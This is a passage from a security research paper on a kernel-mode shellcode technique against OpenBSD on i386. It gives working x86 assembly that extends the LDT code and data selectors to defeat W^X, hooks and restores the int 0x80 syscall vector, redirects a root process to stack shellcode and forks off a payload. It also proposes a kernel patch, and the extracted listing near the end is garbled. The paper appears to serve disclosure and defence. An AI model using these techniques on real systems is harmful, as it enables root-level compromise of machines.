mov edx,[ebx+eax]
mov ecx,[ebx+eax+0x4]
shr edx,16 ; base_low-->edx
mov eax,ecx
shl eax,24; base_middle
-->
edx
shr eax,8
or edx,eax
mov eax,ecx; base_high --> edx
and eax,0xff000000
or edx,eax
mov ebx,edx ;ldt--> ebx
Since the GDT is organized similarly to the IDT (addresses are not
contiguous in memory) the results must be ”assembled”. As we can see,
the ﬁnal instruction puts the real LDT position in the EBX register. In
this table, is the info that we need to defeat the OpenBSD protections.
Extends the length of DS and CS: As we can see on the section 5, The
method used on OpenBSD to prevent execution on the stack is to
limit the CS selector length. If we extend this selector to cover the
entire address space, from 0 to 4 GB (like Windows NT does) We
could execute code anywhere on the process. We do this with these
instructions:
; Extend CS selector
15
6.2
Detailed description of operation
6
SYSCALL HOOK
or dword [ebx+0x1c],0x000f0000
; Extend DS selector
or dword [ebx+0x24],0x000f0000
The bits 16-20 are the MSB in the selector range (Again, the range is
not contiguous on the LDT entry)
Modify return address of the Int 0x80: Now we can execute code on
the stack, so the next logical step is to change the return position
of the calling process (that we know is root) to the stack. We could
overwrite info on the .BSS region of the process, or even the .TEXT
region, but the process will probably crash because we are corrupting
important sections of its memory. Since we don’t want to kill the calling
process, one of the most secure regions to overwrite with our user-mode
shellcode, is the unused portions of the stack.
;Return to stack
mov edi,[esp+8]
add edi,STACK_SAVE_LEN
mov ebx,[esp+RETURN_ADDRESS]
mov [esp+RETURN_ADDRESS],edi ; And now we return to this
The position on the stack where the current system call will return is
now stored in EDI, and we backup the actual return address in EBX.
Copy the user-mode ShellCode to the return position: As we now have
adjusted the selectors (6.2), a simple movsd instruction can be used:
push edi
push esi
add esi,0xd5 ; ***** USER_SHELLCODE offset
mov ecx,SC_LEN ; *** USER_SHELLCODE LEN (in dwords)
rep movsd
pop esi
pop edi
mov [edi+1],ebx ; Write real return address
Restore the original Int 0x80 vector: This is the inverse of the opera-
tion realized by the ShellCode, and is a little complex because of the
format of the entry on the IDT:
16
6.2
Detailed description of operation
6
SYSCALL HOOK
; --- Restore Xsyscall
sub esp, byte 0x7f
sidt [esp+4]
mov ebx,[esp+6]
add esp, byte 0x7f
mov edx,[ebx+0x400]
mov ecx,[ebx+0x404]
mov eax,[esi+0x1bf] ; EAX <-- Position of old System Call
push eax
and eax,0x0000ffff
and edx,0xffff0000
or edx,eax
mov [ebx+0x400],edx ; Fill MSB of System call address
pop eax
and eax,0xffff0000
and ecx,0x0000ffff
or ecx,eax
mov [ebx+0x404],ecx ; Fill LSB of System call address
continue with the original syscall: Finally, the selectors are ﬁxed and a
JMP to the real system call is issued:
;fix selectors
push fs
pop ds
push fs
pop es
popa ; aef
jmp 0xFFFFFFFF
The address 0xFFFFFFFF is a placeholder for the real system call,
ﬁlled in previously by the ShellCode.
Now, the system is released from the Hook, and continues normally, except
for the calling process: This process will return to the stack, and because
the protections were lowered, the execution will continue and our user-mode
shellcode will execute normally.
17
6.3
context-switch limit
7
USER SHELLCODE
6.3
context-switch limit
There is still a limit on the user-mode shellcode execution: In the next
context-switch, the LDT will be restored and the code executing on the
stack will no longer be permitted to execute. The shellcode execution ﬂow
must exit the stack region immediately, or risk causing a SEGFAULT on the
next context-switch. Thankfully, today’s computers are fast and we have
plenty of time to fork, claim memory, and exit, so this is really not an issue.
7
User ShellCode
The user-shell code seems like the ﬁnal step, now we can execute any system
call as root, but there are two disadvantages:
1. The process will stop the normal operation and will start to execute
our code. This may not be a big problem if the injected process is a
child of the Apache web server 8, but we really cannot control which
process the shellcode is injected into. For example it could be the init
process and killing this process is not a good idea.
2. We have a very short time to execute before we are context-switched
and loose the ability to execute on the stack, so we must copy the
shellcode to a more secure area to continue execution.
Therefore the user-mode shellcode must take a series of steps before the ﬁnal
payload is executed.
7.1
Pseudo code
1. Ask for a chunk of executable and writable memory (We use the MMAP
system call for this)
2. copy the rest of the shellcode and continue the execution on this region.
3. Do a FORK system call.
4. On the child: Continue the execution of the ﬁnal payload.
5. On the parent process: Return to the original call.
8In tests, the most commonly injected process on OpenBSD 4.0 with default installation
was sendmail, because it periodically makes a couple of system-calls
18
7.2
Detailed description of operation
7
USER SHELLCODE
7.2
Detailed description of operation
The operation of this code is not diﬀerent than any other user-mode Shell-
Code, but the code it’s explained for completeness.
Ask for a chunk of executable and writable memory: This is a very
standard call to mmap system call. OpenBSD protection WˆX says
that nothing writable is executable, but this system call provides,
legally, a region that violates this rule.
; mmap
xor eax,eax
push eax ; offset 0
push byte -1 ; fd
push ax
push word 0x1002 ; MAP_ANON | MAP_PRIVATE
push byte 7 ;PROT_READ+PROT_WRITE+PROT_EXECPR
push dword 0x1000 ; size (4096 bytes should be enough for everybody)
push eax ; address = 0
push eax ; NULL
mov al,0xc5
mov ebx,esp
int 0x80
The pointer to the newly allocated executable region is now in EAX.
Copy the shellcode and jump: A simple movsd and jmp to the newly
allocated block will do:
; Copy to executable region
mov edi,eax
mov ecx,SC_LEN
CALL GETEIP2
GETEIP2:
pop esi
add esi,byte 0x8
rep movsd
jmp eax
At this point, we are safe for the context switch.All OpenBSD pro-
tections will activate again but the shellcode can continue to execute
19
8
FAILED ATTEMPTS
safely forever. But it would be nice if the injected process doesn’t die,
so we fork.
Do a FORK system call:
xor eax,eax
mov al,byte 2
int 0x80
test eax,eax
je FINAL_PAYLOAD
popf
popa
ret ; return to parent process
FINAL_PAYLOAD:
;/// Put final payload here!!
The parent process now has resumed execution normally, and the child
process is executing the payload, wherever it is, forever.
8
Failed attempts
Many attempts were done before reaching this set of steps. The shellcode
didn’t change very much, because at the time and position in the kernel
where it’s executed, you can’t do a lot of things easily, except to hook the Int
0x80. But in the system call hook we tried to do a couple of things before
reaching the ﬁnal version, with interesting results:
• The ﬁrst and most simple attempt was to try to make system calls from
kernel mode. This didn’t work because of little understood reasons 9
(And as a side note, caused a lot of trouble on vmware images).
• The second attempt resulted in the following curious outcome: at ﬁrst,
we made the system call hook try to write directly to the .TEXT section
of the executable, directly on the point of return, with our shellcode.
This seems impossible to do, because of the memory-page protections
that OpenBSD implements on all the .TEXT region. But the Pentium
processor has a ﬂag on CR2 (Control Register 2) accessible only on
RING-0 that disables all the page-protection mechanisms and allows
the code to write anywhere.
By setting this ﬂag, we wrote to the
.TEXT of the executable and voila! We landed on our shellcode and
9OpenBSD would think that a system-call realized from within a system-call was a
Linux system call, and won’t execute it.
20
9
PROPOSED PROTECTION
we were very happy. But in a cruel twist, the ELF ﬁles on OpenBSD
are memory-mapped, so when we wrote to the .TEXT section, we really
were writing to the ELF ﬁle directly on the disk, trashing our OpenBSD
installation. That trick didn’t work.
0x00000000
0xffffffff
4 GB
kernel
0xD0000000
0xD1000000
Kernel Code Segment (CS)
Kernel Data Segment (DS)
CS shrink
mbuf chains, etc
Figure 5: OpenBSD Kernel CS selector modiﬁcation
9
Proposed Protection
A possible ﬁx to this type of vulnerability is to implement a kind of protec-
tion similar to WˆX but on the kernel-level. This is already done on some
architectures, but not in the more popular i386. A quick ﬁx to the OpenBSD
kernel is possible and is proposed in this section.
We can see on the listing 4, the initial bootstrap selector setup, done
on the init386() function. The interesting ones are the GCODE SEL and
the GICODE SEL, the Kernel-mode and Interrupt-mode code selector setup
repectively.
We can see that these selectors are 4 GB in size each, but
we could reduce this length so the memory above the kernel binary is not
executable.
The kernel-image starts at 0xD0000000, and is aproximately
6 MB length. We can shrink the Code selector (And the Interrupt Code
Selector too, or hardware interrupts will be unprotected) to the 0xD1000000
(see Figure 5), leaving plenty of space for the kernel to execute. As the mbufs
structures and kernel stack begins at 0xD2000000, the exploit described in
this article will not execute with this patch:
sys/arch/i386/i386/machdep.c
- setsegment(&gdt[GCODE_SEL].sd, 0, 0xfffff, SDT_MEMERA, SEL_KPL, 1, 1);
- setsegment(&gdt[GICODE_SEL].sd, 0, 0xfffff, SDT_MEMERA, SEL_KPL, 1, 1);
+ setsegment(&gdt[GCODE_SEL].sd, 0, 0xd1000, SDT_MEMERA, SEL_KPL, 1, 1);
+ setsegment(&gdt[GICODE_SEL].sd, 0, 0xd1000, SDT_MEMERA, SEL_KPL, 1, 1);
21
10
CONCLUSION
Listing 4: bootstrap selectors setup
sys / arch / i386 / i386 /machdep . c
void
i n i t 3 8 6 ( paddr t
f i r s t
a v a i l )
{
.
.
.
/∗
make
bootstrap
gdt
g a t e s
and
memory
segments
∗/
setsegment (&gdt [GCODE SEL ] . sd ,
0 ,
0 x f f f f f ,
SDT MEMERA,
SEL KPL ,
1 ,
1 ) ;
setsegment (&gdt [ GICODE SEL ] . sd ,
0 ,
0 x f f f f f ,
SDT MEMERA,
SEL KPL ,
1 ,
1 ) ;
setsegment (&gdt [GDATA SEL ] . sd ,
0 ,
0 x f f f f f , SDT MEMRWA,
SEL KPL ,
1 ,
1 ) ;
setsegment (&gdt [ GLDT SEL ] . sd ,
ldt ,
s i z e o f ( l d t ) − 1 ,
SDT SYSLDT,
.
.
.
}
void
setsegment ( sd ,
base ,
l i m i t ,
type ,
dpl ,
def32 ,
gran )
struct
s e g m e n t d e s c r i p t o r
∗sd ;
void
∗ base ;
s i z e
t
l i m i t ;
int
type ,
dpl ,
def32 ,
gran ;
We replace the 0xﬀﬀf limit10 with a more conservative 0xd1000. This simple
modiﬁcation adds some protection to kernel attacks that place the shellcode
on the kernel stack or kernel memory structures. This simplistic solution
doesn’t take into account a lot of kernel mechanisms, like the loadable kernel
modules, that will not execute in this scenario.
10
Conclusion
Writing this ShellCode we learned that Kernel-mode programming is a very
diﬀerent beast that user-mode, and even with a great debugging environment
like the one provided with OpenBSD 11 unexpected things are bound to
happen.
On the assembly side, we learnt to use instructions and CPU features
used only by operating system’s engineers and low-level drivers.
On the security side, we can conclude that even the most secure and
audited system contains bugs and can be exploited. It’s almost certain that
new and complex software modules like an IPv6 stack contain bugs.
Finally, this exploit wouldn’t be possible if kernel protections were in place
on OpenBSD. Against user bugs, user-mode protections are very eﬀective,
but proved totally innocuous for kernel-mode bugs.
Adding kernel-mode
protections is diﬃcult on the i386 platform, but will be necessary on future
10The limit is in 4Kb Pages, so 0xﬀﬀf covers the 4 GB address space
11Using the DDB kernel debugger.
22
REFERENCES
LISTINGS
kernels, and more so on security-oriented products.
We presented a generic kernel shellcode technique, not in theory but a
real attack. And because the basic internal structures are similar between the
major operating systems, with some modiﬁcatios this kind of kernel attack
could work also on other BSDs, Linux or Windows.
References
[1] Original Core Security Advisory
http://www.coresecurity.com/ in-
dex.php5?module=ContentMod&action=item&id=1703
[2] OpenBSD Home Page http://www.openbsd.org/
[3] T. de Raadt- Exploit mitigation Techniques http://www.openbsd.org
/papers/ven05-deraadt/index.html
[4] Future direction of PaX http://pax.grsecurity.net/docs/pax-future.txt
Listings
1
mbuf structure deﬁnition . . . . . . . . . . . . . . . . . . . . .
3
2
m dup1() overﬂow instruction . . . . . . . . . . . . . . . . . .
5
3
m ext structure deﬁnition
. . . . . . . . . . . . . . . . . . . .
6
4
bootstrap selectors setup . . . . . . . . . . . . . . . . . . . . .
22
23